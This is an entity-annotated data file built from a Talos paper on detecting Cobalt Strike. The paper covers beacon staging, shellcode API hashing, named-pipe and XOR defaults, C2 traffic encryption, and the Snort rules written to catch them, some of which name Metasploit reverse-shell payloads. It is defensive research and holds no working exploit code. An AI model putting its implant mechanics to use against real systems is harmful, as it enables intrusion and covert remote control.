20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,ClamAV,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"® 
signatures to detect ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,", version 4.0, a common 
platform utilized as one part of attack processes. This 
paper outlines the challenges we were confronted with 
when analyzing ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,", and the ways we crafted our 
detection. We will address all the modules we’ve updated 
coverage for, how we analyzed and thought about detection 
and the signature that resulted.

GETTING UP TO SPEED
",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," is a paid penetration-testing tool that anyone 
can use. Malicious actors have used it for years to deploy 
“Listeners” on victim machines. In this paper, we’ll dive into 
some of the core components of ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," and then 
break down our analysis of these components and how we 
can protect against them. We will also look at ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," 
from the adversary’s perspective.

LISTENERS

Listeners are at the core of ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,". They allow 
adversaries to configure the C2 method used in an attack. 
Every attack or payload generated in ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," requires 
the targeted user to select a Listener to embed within 
it. This will determine how an infected host will reach 
out to the C2 server to retrieve additional payloads and 
instructions.

When creating a listener, the user can configure the payload 
type, name, C2 server and port, and other various options 
such as named pipes or proxy servers (Figure 1). Users can 
choose from:

• Beacon DNS

• Beacon HTTP

• Beacon HTTPS

• Beacon SMB

• Beacon TCP

• External C2

• Foreign HTTP

• Foriegn HTTPS

Potentially the most powerful aspect of ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," is 
the array of malleable C2 profiles, which allows users to 
configure how attacks are created, obfuscate and manage 
the flow of execution at a very low level.

There are several ways to visualize how an adversary 
interacts with infected ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," hosts, such as a 
session table, pivot graph, or a target table. In Figure 2, 
you can see the session table, along with some options 
available when selecting a host.

Figure 1: ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," Listener console



page 4 of 29© 2020 Cisco. All rights reserved. talos-external@",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cisco,org
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,".com  |  talosintelligence.com

The art and science of detecting ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

However, this does not give insight into how the hosts are 
interconnected, nor the C2 path taken when contacting the 
",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," C2. For that, we can swap to the Pivot Graph 
(Figure 3).

In Figure 3, the `WIN-498IQCJRIUQ` host is connected through 
“DESKTOP-R8VN37V” and all C2 operations are executed 
using that path. Listeners that are designed only to connect 
infected hosts laterally include the SMB and TCP beacons.

Attackers can also control hosts through the interactive beacon 
console. This allows for more advanced control of a host.

WEB MANAGEMENT

",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," delivers exploits and/or malicious payloads 
using an attacker-controlled web server. The web server 
can be configured to perform the following actions:

• Host files

• Clone an existing website to trick users

• Scripted web delivery

• Signed Applet Attack (",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Java,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,")

• Smart Applet Attack (",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Java,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,")

• System profiling

Figure 4 shows how an adversary would manage the 
“Sites” console from their end. In this example, we’re 
hosting a malicious ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,PowerShell,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," script on the ‘/malware’ 
URI over port 80.

You can also see that the HTTP based listeners are also 
present as they are used to deliver additional payloads and 
C2 commands to victims.

When a victim reaches out to the ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," web server, 
it’s logged for operators.

Figure 2: ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," session table

Figure 4

Figure 3: ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," Pivot Table



page 5 of 29© 2020 ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cisco,org
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,". All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science of detecting ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

REPORTING

",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," offers a variety of report generators to get a 
complete breakdown of the infected hosts and associated data.

Available options include:

• Activity report

• Hosts report

• Indicators of compromise

• Sessions report

• Social engineering report

• Tactics, techniques and procedures

ATTACK ANALYSIS

TARGET MODULE: RAW SHELLCODE GENERATOR

",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," generates raw, malicious payloads that an 
attacker could implement into other attacks. The payload 
can be generated as raw shell code or preformatted in 

almost any language desired, including ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,PowerShell,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,", Python 
and ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Java,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,", among many others. When generating raw 
payloads, the user is presented with only the HTTP, HTTPS 
and DNS beacons to choose from. The generated payload 
can act as a staging payload for the ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," beacon, to be 
plugged into an exploit of their choice.

For analysis, we only concentrated on the x86 and x64 
binary payloads generated in C. No matter the code 
selected, the resulting payload isn’t designed to execute by 
itself. The generator’s primary function is to format the shell 
code in a way that allows the user to drop in a third-party 
exploit or custom exploits and have it preformatted in that 
particular programming language.

Figure 5 shows a payload generated with the x86 HTTP listener.

EXECUTION

Since the payload is only a bunch of raw bytes, it won’t 
just run if a user double-clicked the file. The adversary 
would have to load the shellcode and jump to the desired 
entry point. This is trivial — we can use a quick C script that 

Figure 5: ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," payload generated with x86 HTTP Listener.



page 6 of 29© 2020 ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cisco,org
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,". All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science of detecting ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

loads the desired shellcode and then 
executes it as if it were a function. 
This enables defenders to quickly 
analyze shell code in some cases 
without having to perform any over-
the-top attempts to load it (Figure 6).

Once the buffer is allocated and 
called, we can see the start of the 
",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," shellcode in Figure 7.

It starts with a common shellcode 
instruction `cld`, which is used to 
make sure strings are processed 
from left to right by clearing the 
Direction Flag (DF). Then, we 
immediately call the first function to 
import “wininet.dll” (Figure 8).

Immediately, we can see a string 
for “wininet”, and a four-byte hex 
value pushed onto the stack, and an 
indirect register call on `ebp`, which 
currently points to the first instruction 
after `shellcode_main()` [shellcode_
main+0x6].

The shellcode is unaware of the 
libraries it needs to execute and 
needs to import them. This technique 
is often used by malware to 
obfuscate calls to the ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Windows API,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," 
by resolving imports using a hash of 
the function. This one, in particular, 
is a modified version of ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Metasploit,tool
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"'s 
“reverse_http” shellcode (Figure 9).

Figure 10 shows a pointer to the 
Process Environment Block (PEB) 
and the PEB_LDR_DATA data 
structure within. This target is the 
`InMemoryOrderModuleList,̀  which 
contains a list of all modules loaded 
in memory. By traversing this list, 
we can also get a list of functions 
available within each module. ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," iterates over each DLL, 
converts the full name to lowercase 
and begins to calculate a hash 
value of each export using the full 
DLL name and the desired function 

Figure 6

Figure 7

Figure 8

Figure 9

https://en.wikipedia.org/wiki/Process_Environment_Block


page 7 of 29© 2020 ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cisco,org
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,". All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science of detecting ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

name. The hashing algorithm used is 
a simple ROR13, the same one used 
by ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Metasploit,tool
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,".

The retrieved DLL + Function name 
is compared to a calculated hash 
against the hex value (0x726774C) 
passed in earlier as an argument 
to `call_by_hash()`. If the match is 
successful, ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," calls that 
function immediately with the other 
arguments passed.

Figure 11 shows the relevant 
functionality from the ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Metasploit,tool
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"’s 
`hash.py:̀

The payload makes an outbound 
HTTP call to the configured HTTP 
C2 server.

The ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," C2 server responds 
with an HTTP 200 OK, containing a 
very large binary blob. This blob is 
the core functionality of ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,", 
better known as “",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,beacon.dll,ioc
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,".” From 
here on out, this is the code that will 
be used to control an infected host. 
After retrieving the DLL, it is loaded 
via a technique called ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Reflective DLL injection,mitre_attack
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,".

DETECTION

Now that we have a good 
understanding of how a ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," payload works, we can work 
on creating detection for these 
payloads. The goal when creating 
detection content is to cover 
something in its entirety, with the 
fewest rules, without triggering false 
positives. This, for the most part, 
ensures we are creating generic 
detection rather than something that 
only targets one thing. At Talos, we 
want our detection to catch variants 
and potential future threats.

When looking into coverage for the 
",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," payloads, we found we 

Figure 10

Figure 11

https://www.google.com/url?q=https://attack.mitre.org/techniques//001/&sa=D&ust=1596559074788000&usg=AFQjCNGxlDBHg3K-731T8ArLHwcCpVrVXQ
https://www.google.com/url?q=https://attack.mitre.org/techniques//001/&sa=D&ust=1596559074788000&usg=AFQjCNGxlDBHg3K-731T8ArLHwcCpVrVXQ


page 8 of 29© 2020 ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cisco,org
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,". All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science of detecting ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

had some prior coverage alerting on the payloads, including 
these ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Snort,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," rules:

• 1:15306:22

• 1:11192:20

• 1:30471:3

• 1:30229:3

The first two are generic file type detection rules that are 
the base for setting flowbits in ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Snort,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," and can be ignored. 
However, SIDs 1:30471 and 1:30229 are ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Metasploit,tool
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," 
shellcode rules we released years ago that still apply here.

At the time, these rules were suspected to be false positive 
prone and were not enabled by default in policy. We can’t 
narrow them down to a specific type or protocol. Therefore, 
we have to remove a lot of checks that tell ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Snort,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," whether or 
not to inspect a packet further and re-enabled them.

The key element here is the ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Snort,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," header, `alert tcp any 
any -> any any`. Most ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Snort,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," rules will declare a traffic 
direction (coming from or going to the user’s network) 
and the applicable port ranges. Since this raw shellcode 
can be used with potentially any exploit over an unknown 
protocol or port, we can’t narrow it down to inspection on 
for example just port 80. We also don’t know if a host is 
compromised already and attempting to move laterally, so 
we can’t specify the source and destination networks. This 
means that ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Snort,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," will attempt to match this particular byte 
sequence on all TCP traffic crossing the sensor. Not only 
is this undesirable for performance reasons, it heightens 
the potential for false positives. We need to be a little more 
cautious when releasing a catch-all rule such as this.

The following ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Snort,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," rule also helped in detecting reverse 
shell sessions from ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Metasploit,tool
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

• [1:30480:3]  INDICATOR-SHELLCODE ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Metasploit,tool
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," pay-
load windows_x64_meterpreter_reverse_https

After analyzing the preexisting ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Snort,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," rules, the only thing 
left to cover is the outbound HTTP request and the binary 
blob ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," retrieves from the C2 server. Typically, 
covering the initial outbound HTTP GET would be ideal 
since we want to identify potential C2 traffic as fast as 
possible and flag the host as compromised in ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cisco,org
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," 
Firepower NGFW. However, the URI code we used in our 
research could be anything and was always random in 
samples. The HTTP Header fields were also unhelpful, since 
there wasn’t anything unique enough to distinguish the 
request apart from benign traffic. This leaves us with only 

the HTTP response containing the binary blob.

The shellcode started similarly to the raw payload with a 
`cld` instruction followed by a short function designed to 
decrypt the rest of the payload with an operator configured 
XOR key.

Since we don’t want to target encrypted data with our 
detection, we used the start of the shellcode as the 
detection target. This resulted in two new rules, both 
looking for the same thing across different listeners.

• [1:53757:1]  MALWARE-OTHER ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,CobaltStrike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike, ,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,beacon.dll,ioc
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"
download attempt

• [1:53758:1]  MALWARE-OTHER ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,CobaltStrike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike, ,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,beacon.dll,ioc
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," 
download attempt

TARGET MODULE: STAGED/STAGELESS EXECUTABLE 
GENERATOR

This module will encompass both staged and stageless 
",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike, ,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,beacons,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,". This is the core component 
delivered to a victim host and establishes persistence, C2 
communication, and any further execution on the host. 
",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Beacons,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," are extremely versatile and expose a huge number 
of features for operators.

Staged vs. Stageless

Stageless payloads are delivered to the victim all at once. 
Typically, a stageless payload already contains a large 
variety of malicious functionality and will not require 
additional resources to infect the victim.

Staged payloads are usually small, malicious payloads 
that are used to load a larger, more robust payload. This 
allows an attacker to transfer a small binary to a targeted 
host and retrieve the desired payload afterward. Stagers 
are designed to be as small as possible so that they can 
be delivered using different techniques and leave less of a 
footprint.

Having a smaller initial payload with less functionality 
is more likely to evade AV detection by appearing to be 
benign. A stager can then grab the larger payload for more 
functionality and load it directly into memory.

Stagers allow adversaries to embed your payloads in 
different methods. An adversary could take staged code and 
send it in an exploit with resource limitations on the target.



page 9 of 29© 2020 ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cisco,org
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,". All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science of detecting ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Beacon,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," options

Generating a ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,beacon,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," payload can 
result in a few different types of 
executable files — each of them 
embedded with a Listener and 
architecture of your choice. This will 
generate an `",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,artifact.exe,ioc
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"` file to save 
on disk. How it’s used from there is 
up to the operator.

• Raw (Stageless only)

• Windows EXE

• Windows Service EXE

• Windows DLL (32 bit)

• Windows DLL (64 bit)

Staged

After startup, ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," spawns a 
new thread designed to construct a 
named pipe for further execution. For 
the purposes of research, we opted 
to utilize a 32 bit executable with a 
reverse HTTP listener.

Figure 12 shows a format string that 
calls to `sprintf()` with the default 
structure of the named pipe. The 
four-digit number is a randomly 
generated number but we can see 
that in a default configuration, the 
name has a static structure like  
“",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,\\\\.\\pipe\\MSSE-6722-server.,ioc
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"”

Following thread creation, the 
named pipe is created and a 
connection is initiated. The goal of 
this is to process additional shellcode 
embedded within the binary by 
writing it to the named pipe thread.

This pipe is decrypted using a rolling 
XOR against the data. The default 
XOR key for this particular payload 
is 0xE3F4C314. After decryption is 
complete, another thread is created 
that immediately jumps to and 
executes the shellcode (Figure 13).

Figure 12

Figure 13



page 10 of 29© 2020 ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cisco,org
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,". All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science of detecting ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

Stageless

Stageless operates in the same way a staged payload 
does — it still spawns a named pipe and data needs to 
be decrypted just like a staged payload. This payload in 
particular is larger than 200KB.

However, once the final payload is decoded, it needs to be 
loaded into memory. This is performed using a technique 
called ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Reflective DLL loading,mitre_attack
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," — the process of loading a 
library from memory into a host process.

An executable needs to access various resources to 
function correctly. It needs to know its base address in 
memory and have valid headers and a fully built import 
address table. This is how an executable knows where to 
call functions such as LoadLibrary or GetProcAddress.

Once the reflective loader has rebuilt the necessary sections 
and relocated the image, we’ll see the actual path of execution.

Once we unpack ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,beacon.dll,ioc
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,", we can dump it to disk and see 
the final artifact.

",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Beacon,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," configuration

",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," configuration is marked in the executable by 
patterns that allow us to parse it directly out of an unpacked 
",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,beacon,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," DLL. The configuration is XOR encrypted, but by 
default, use a static XOR key for each respective ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,beacon,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," 
version (3 or 4).

Figure 14 shows a decrypted ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," configuration 
from the unpacked ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Beacon,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,".

C2 COMMUNICATION

Heartbeat

An infected host will reach out to the ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," C2 
server periodically with a heartbeat, sending basic 
metadata back home and gathering any commands issued 
by an operator. When a command is requested to be 
executed on the host, it’s queued up and waits for that host 
to reach out.

Figure 14

https://www.exploit-db.com/docs/english/13007-reflective-dll-injection.pdf
https://www.exploit-db.com/docs/english/13007-reflective-dll-injection.pdf


page 11 of 29© 2020 ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cisco,org
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,". All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science of detecting ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

Figure 15 shows the heartbeat.

It looks pretty benign, but all the metadata is stored in the 
HTTP cookie. We can’t simply gain access to that data by 
base64-decoding the cookie, since ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," heartbeat 
data is encrypted. ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," uses RSA with PKCS1 
padding to encrypt the data prior to sending it back home.

Talos researchers extracted the private/public key 
directly from the teamserver running on a virtual machine, 
something that wouldn’t be possible outside of an isolated 
research environment.

Tasks

Now that we understand the heartbeats, let’s look at 
the exchange for tasking a ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,beacon,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,". When a task is not 
available, the server will respond with another encrypted 

payload in the HTTP 200 OK (Figure 16).

When configured, the response payload is an encrypted 
task. ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," uses AES-256 in CBC mode with HMAC-
SHA-256 to encrypt task commands. The AES key can 
be found in the ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,beacon,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," metadata we decrypted earlier. 
It is calculated using the first 16 bytes of the decrypted 
metadata.

Callbacks

After execution, the host calls back to the C2 server. 
This time, the default configuration was an HTTP POST 
containing another encrypted payload (Figure 17).

The first four bytes are the size of the encrypted payload so 
we skip those when decrypting.

Figure 15

Figure 16

Figure 17



page 12 of 29© 2020 ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cisco,org
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,". All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science of detecting ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

The structure of the data observed is:

• 4 bytes - Counter

• 4 bytes - Data Size

• 4 bytes - Type of callback

• Variable - Data

Figure 18 is a decrypted Process List callback.

Detection

Based on these actions, we wanted to write detection 
that would catch a ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," stager being downloaded 
before it can target anything else. Catching the stager is 
pivotal, as it is most likely to prevent infection. Once the 
stager traverses into memory, it reflectively loads the final 
",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,beacon,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," payload and becomes harder to deal with.

Researchers first generated every variant possible and 
created PCAPs of the stager traversing over typical ports 
seen in file-data traversal.

Once again, we triggered the ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Metasploit,tool
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," shellcode rules for 
every payload when we checked prior coverage:

• 1:30229 INDICATOR-SHELLCODE ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Metasploit,tool
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," windows/
shell stage transfer attempt

• 1:30471 INDICATOR-SHELLCODE ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Metasploit,tool
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," payload 
windows_adduser

• 1:30480 INDICATOR-SHELLCODE INDICATOR-SHELL-
CODE ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Metasploit,tool
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," payload windows_x64_meterpret-
er_reverse_https

